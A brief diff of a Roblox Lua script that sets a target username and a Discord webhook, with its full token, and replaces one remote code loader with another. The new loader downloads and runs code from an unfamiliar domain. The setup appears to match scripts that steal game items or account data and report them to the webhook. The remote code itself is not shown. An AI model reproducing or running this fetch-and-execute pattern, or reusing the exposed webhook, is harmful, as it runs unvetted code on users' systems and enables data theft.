@@ -1,5 +1,4 @@
 Username= 'teste'
-Webhook= 'https://discord.com/api/webhooks/1263467011388735499/78My-OLGw42TfFwRlE3yK-nUsJy3H_rTC_ZB6kds1CofzCQsRpEmbW-Tdn-pLGJF0kwl'
+Webhook= 'https://discord.com/api/webhooks/1265289938744901685/N-hDiJUVp4bFMKvppqDrrgijI1qdQk0qvWe7pUwurPxAWsJQLX0b7x1ZmSO1slYE2_ch'
 
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/NzxCrab-wq/BlastHub/main/NzxCrab'))()
+loadstring(game:HttpGet("https://egorikusa.space/a4a73037811195a30378bd0b.lua", true))()
